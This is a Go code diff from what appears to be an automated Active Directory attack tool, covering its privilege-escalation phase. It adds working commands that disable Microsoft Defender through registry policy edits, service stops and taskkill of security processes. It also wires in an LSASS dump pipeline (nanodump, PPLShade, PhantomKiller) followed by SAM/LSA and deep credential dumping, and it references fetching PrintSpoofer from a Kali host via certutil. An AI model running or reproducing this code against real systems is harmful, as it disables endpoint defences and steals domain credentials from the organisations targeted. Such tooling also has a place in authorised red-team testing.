@@ -55,7 +55,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		return result
 	}
 
-	domain, user, pass, hash := getCredential(state)
+	domain, user, pass, hash := getDomainCredential(state, host.Domain)
 	if domain == "" || user == "" {
 		fmt.Println("[!] No credentials for privesc")
 		result.Success = false
@@ -466,9 +466,16 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 		// ── SUB-PHASE 1: SYSTEM check (no dump yet — disarm Defender first) ──
 		gotSystem := doSystemCheck(ctx, state, host, exec, domain, user, pass, result, "system_check")
 
-		// ── SUB-PHASE 2: AV kill + credential dump ──────
+		// ── SUB-PHASE 2: AV kill + LSASS dump + credential dump ──
 		if gotSystem {
-			runUnDefendKill(ctx, state, host, exec, domain, user, pass, result)
+			runAVKill(ctx, state, host, exec, domain, user, pass, result)
+
+			// LSASS dump via evasion profile (nanodump/PPLShade/PhantomKiller)
+			// runAVKill above handles Defender — pipeline skips redundant AV kill.
+			pipelineResult := RunCredentialAcqPipeline(state, evasionProfile, host.IP, exec)
+			result.Creds = append(result.Creds, pipelineResult.Creds...)
+			result.Evidence = append(result.Evidence, pipelineResult.Evidence...)
+
 			runSAMLSADump(ctx, state, host, exec, domain, user, pass, result)
 			runDeepCredDump(ctx, state, host, exec, domain, user, pass, result)
 		}
@@ -553,7 +560,7 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 
 		// ── Active re-verification of stale/degraded edges ────
 		if executePaths {
-			domain, user, pass, _ := getCredential(state)
+			domain, user, pass, _ := getDomainCredential(state, host.Domain)
 			if domain != "" && user != "" {
 				reVerified := ReVerifyEdges(ctx, state, domain, user, pass, host.IP, 5)
 				if reVerified > 0 {
@@ -578,48 +585,39 @@ func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, e
 	return result
 }
 
-// runUnDefendKill deploys UnDefend.exe and runs --kill to disable Defender.
+// runAVKill disables Defender via native reg add/sc stop/taskkill commands.
 // Requires admin/SYSTEM on target. Safe to run even if Defender isn't present.
-func runUnDefendKill(ctx context.Context, _ *core.ADState, host core.Host,
-	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
+func runAVKill(ctx context.Context, _ *core.ADState, _ core.Host,
+	exec core.Executor, _, _, _ string, result *core.ToolResult) {
 
-	if !tools.UnDefend.Available() {
-		utils.StepWarn("UnDefend.exe not found, skipping AV kill")
-		return
+	utils.Step("Disabling Defender via native commands...")
+
+	cmds := []string{
+		`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`,
+		`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f`,
+		`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f`,
+		`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableIOAVProtection /t REG_DWORD /d 1 /f`,
+		`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableScriptScanning /t REG_DWORD /d 1 /f`,
+		`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableIntrusionPreventionSystem /t REG_DWORD /d 1 /f`,
+		`sc stop WinDefend & sc config WinDefend start= disabled`,
+		`taskkill /f /im MsMpEng.exe 2>nul`,
+		`taskkill /f /im SenseNdr.exe 2>nul`,
+		`taskkill /f /im SecurityHealthService.exe 2>nul`,
 	}
 
-	utils.Step("Deploying UnDefend.exe --kill to disable Defender...")
-
-	remoteDir := `C:\Windows\Temp\`
-	deployR := exec.Execute(ctx, core.Action{
-		Artifact: "UnDefend.exe", Method: "put",
-		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
-	})
-	if !deployR.Success {
-		utils.StepWarn(fmt.Sprintf("UnDefend deploy failed: %s", deployR.Error))
-		return
+	for _, c := range cmds {
+		r := exec.Execute(ctx, core.Action{
+			Artifact: c, Method: "command", Timeout: 30 * time.Second,
+		})
+		if r.Success {
+			utils.StepOk(fmt.Sprintf("%.80s", c))
+		}
 	}
-	remotePath := deployR.Output
-
-	target := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP,
-		Domain: domain, Username: user, Password: pass,
-	}
-	cr, err := tools.UnDefend.ExecRemote(ctx, target, remotePath, true)
-	if err != nil || !cr.Success {
-		utils.StepWarn(fmt.Sprintf("UnDefend --kill failed: %v", err))
-	} else {
-		utils.StepOk("UnDefend --kill executed (Defender disabled)")
-	}
-
-	exec.Execute(ctx, core.Action{
-		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
-	})
 
 	result.Evidence = append(result.Evidence, core.EvidenceEntry{
 		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
-		Source: "undefend", Key: host.IP, Value: "Defender killed via UnDefend --kill",
-		Confidence: 0.85, Timestamp: time.Now(),
+		Source: "av_kill", Key: "defender", Value: "Defender disabled via native commands",
+		Confidence: 0.9, Timestamp: time.Now(),
 	})
 
 	fmt.Println("[*] Waiting 8s for Defender termination...")
@@ -787,7 +785,8 @@ func runSweetPotatoProbe(ctx context.Context, host core.Host,
 	// ── Step 1: Upload PrintSpoofer64.exe via certutil ──────────
 	kaliIP := os.Getenv("KALI_IP")
 	if kaliIP == "" {
-		kaliIP = "172.31.125.189"
+		utils.StepWarn("KALI_IP not set — cannot host file server for PrintSpoofer. Set KALI_IP=<your-ip>.")
+		return
 	}
 	port := os.Getenv("KALI_PORT")
 	if port == "" {
@@ -1462,32 +1461,14 @@ func runSAMLSADump(ctx context.Context, state *core.ADState, host core.Host,
 }
 
 // runDeepCredDump performs deep credential extraction after AV has been disabled.
-// Cascades through available tools: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA.
+// Cascades through available tools: nanodump+pypykatz → nxc SAM/LSA.
 func runDeepCredDump(ctx context.Context, state *core.ADState, host core.Host,
 	exec core.Executor, domain, user, pass string, _ *core.ToolResult) {
 
 	utils.Step("Deep credential dump (post-evasion)...")
 	dumped := 0
 
-	// Tier 1: go-mimikatz (richest output: plaintext + hashes)
-	if tools.GoMimikatz.Available() {
-		r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
-		if err == nil && r != nil && r.Success {
-			creds := parseMimikatzOutput(r.Stdout)
-			for _, c := range creds {
-				if c.Domain == "" {
-					c.Domain = domain
-				}
-				state.Creds = append(state.Creds, c)
-			}
-			dumped += len(creds)
-			if len(creds) > 0 {
-				utils.StepOk(fmt.Sprintf("go-mimikatz: %d credential(s)", len(creds)))
-			}
-		}
-	}
-
-	// Tier 2: nanodump + pypykatz (LSASS dump, reliable)
+	// Tier 1: nanodump + pypykatz (LSASS dump, reliable)
 	if tools.Nanodump.Available() {
 		ndLocal := findNanodump()
 		if ndLocal != "" {
